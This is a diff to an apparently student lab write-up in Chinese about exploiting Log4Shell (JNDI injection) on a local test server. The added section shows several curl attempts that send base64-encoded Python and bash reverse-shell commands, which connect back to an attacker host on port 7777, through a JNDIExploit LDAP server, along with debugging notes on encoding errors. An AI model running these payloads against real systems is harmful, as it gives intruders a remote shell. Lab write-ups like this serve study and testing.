@@ -79,8 +79,44 @@ curl -G "http://192.168.8.129:48217/hello" --data-urlencode "payload=\${jndi:lda
 ```
 ![](./pic/修改curl请求成功反弹shell.png)
 
+## 在以上两步中经历的curl修改
+
+### 1. 尝试移除“=”填充符
+
+```bash
+payload='python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.8.132\",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"'
+encoded_payload=$(echo -n "$payload" | base64 -w 0 | tr -d '=' | sed 's/+/%252B/g; s/\//%252F/g')
+curl -G "http://192.168.8.129:58468/hello" --data-urlencode "payload=\${jndi:ldap://192.168.8.132:1389/TomcatBypass/Command/Base64/${encoded_payload}}"
+```
+JNDIExploit 反复报错 Incorrect params。
+__问题分析__
+Base64 编码嵌套问题：Payload 是 bash -c {echo,...}|{base64,-d}|{bash,-i} 的 Base64 编码，但 JNDIExploit 似乎无法处理这种嵌套结构。日志显示工具接收到了 LDAP 查询，但在解析 TomcatBypass/Command/Base64/... 时失败。
+特殊字符干扰：Base64 字符串中的 =（填充符）和 |、{、} 等符号可能被错误解析。
+
+### 2.简化命令格式，避免使用 bash -c {echo,...}|... 这种复杂结构，改用直接命令
+
+```bash
+cmd='bash -i >& /dev/tcp/192.168.8.132/7777 0>&1'
+encoded_cmd=$(echo -n "$cmd" | base64 -w 0 | sed 's/+/%252B/g; s/=/%253D/g')
+curl -G "http://192.168.8.129:58468/hello" --data-urlencode "payload=\${jndi:ldap://192.168.8.132:1389/TomcatBypass/Command/Base64/${encoded_cmd}}"
+```
+JNDIExploit 接收到了正确的 Base64 编码命令（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjguMTMyLzc3NzcgMD4mMQ== 解码后为 bash -i >& /dev/tcp/192.168.8.132/7777 0>&1），但仍然报错 Incorrect params。
+__问题分析__
+JNDIExploit 工具本身对参数的处理上可能有一定问题。
+
+### 3.调整 Base64 编码方式，移除“=”填充符并简化特殊符号处理
+
+```bash
+cmd='bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjguMTMyLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}'
+encoded_cmd=$(echo -n "$cmd" | base64 -w 0 | tr -d '=')
+curl -G "http://192.168.8.129:58468/hello" \ --data-urlencode "payload=\${jndi:ldap://192.168.8.132:1389/TomcatBypass/Command/Base64/${encoded_cmd}}"
+```
+报错及问题与第一次的问题类似，不多赘述。
+
+### 4.调整 Base64 编码格式。JNDIExploit 可能对 URL 编码后的 %2B（+）和 %3D（=）敏感，尝试移除填充符“=”并简化编码。得到完成的代码。
+
 # ~~作业途中偶遇哈吉网站，拒绝POST请求疯狂哈气，拼尽全力，无法战胜~~
-战胜了...暂时的
+我们胜利了...暂时的
 
 # 漏洞缓解与绕过测试
 
